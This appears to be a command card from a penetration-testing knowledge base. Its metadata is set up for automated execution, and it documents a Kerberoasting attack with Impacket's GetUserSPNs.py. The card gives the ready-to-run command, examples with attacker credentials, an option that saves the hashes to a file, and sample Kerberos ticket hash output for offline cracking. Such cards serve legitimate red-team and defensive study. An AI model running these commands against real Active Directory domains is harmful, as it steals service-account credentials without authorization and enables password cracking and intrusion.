---
id: generated-uuid-1
name: getuser-spns-query-domain-and-request-hashes
type: command
executor: python
data: 'GetUserSPNs.py ''$_DOMAIN/$_USERNAME:$_PASSWORD'' -dc-ip $_DOMAIN_IP -request'
output: null
created_at: '2023-10-01T00:00:00.000000+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - Windows
tags:
  - kerberoasting
  - impacket
verified: true
validated: true
---

# getuser-spns-query-domain-and-request-hashes

## Command

```bash
GetUserSPNs.py '$_DOMAIN/$_USERNAME:$_PASSWORD' -dc-ip $_DOMAIN_IP -request
```

## Description

This command uses Impacket's GetUserSPNs.py script to query an Active Directory domain for users with Service Principal Names (SPNs) and requests their Kerberos TGS tickets, extracting crackable password hashes. It is used in Kerberoasting attacks to obtain service account hashes for offline cracking.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN | The target domain name (e.g., corp.local) | Yes |
| $_USERNAME | Attacker's domain username | Yes |
| $_PASSWORD | Attacker's domain password | Yes |
| $_DOMAIN_IP | IP address of the Domain Controller | Yes |
| -request | Flag to request TGS tickets and dump hashes | Yes |

## Examples

### Basic Usage

```bash
GetUserSPNs.py 'corp.local/attacker:pass123' -dc-ip 10.0.0.10 -request
```

### Advanced Usage

```bash
GetUserSPNs.py 'corp.local/attacker:pass123' -dc-ip 10.0.0.10 -request -outputfile hashes.txt
```

## Expected Output

ServicePrincipalName: MSSQLSvc/server.corp.local
  $krb5tgs$23$*svc-mssql$CORP.LOCAL$MSSQLSvc/server.corp.local:*...

(Hashes in Hashcat format for each SPN user; no output if no SPNs found or authentication fails.)

## Related

- [[procedures/Find-Kerberoastable-Users-with-SPNs]]
